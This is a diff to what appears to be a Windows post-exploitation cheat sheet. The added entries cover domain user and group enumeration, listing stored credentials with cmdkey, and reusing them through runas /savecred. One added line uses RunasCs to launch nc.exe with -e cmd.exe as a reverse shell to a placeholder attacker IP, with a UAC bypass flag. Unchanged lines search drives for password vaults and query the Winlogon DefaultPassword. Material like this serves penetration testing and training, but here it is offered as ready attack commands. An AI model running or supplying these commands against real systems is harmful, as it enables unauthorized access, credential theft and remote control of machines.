@@ -10,6 +10,21 @@ net user
 net user <user>
 ```
 
+-> Get information about all groups
+```
+net group /domain 
+```
+
+-> Get information about local groups
+```
+net localgroup
+```
+
+-> Get informations about user
+```
+net user <user> /domain
+```
+
 -> Check user privileges
 ```powershell
 whoami /priv
@@ -47,7 +62,7 @@ schtasks
 ```
 
 -> Location Files
-```
+```powershell
 Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
@@ -55,13 +70,27 @@ Get-ChildItem -Path C:\Users\<user>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.d
 ```
 
 -> Winlogon
-```
+```powershell
 reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
 ```
 
--> Installed Softwares
+-> Stored Credentials
+```cmd
+cmdkey /list
 ```
+-> Run cmd with stored credential
+```cmd
+runas /savecred /user:<user> cmd.exe
+```
+or
+```powershell
+.\RunasCs.exe <user> <password> "C:\Windows\Temp\nc.exe <your-ip> <port> -e cmd.exe" -t 0 –bypass-uac
+```
+- https://github.com/antonioCoco/RunasCs
+
+-> Installed Softwares
+```powershell
 Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall*" | select displayname
 Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall*" | select displayname
 ```
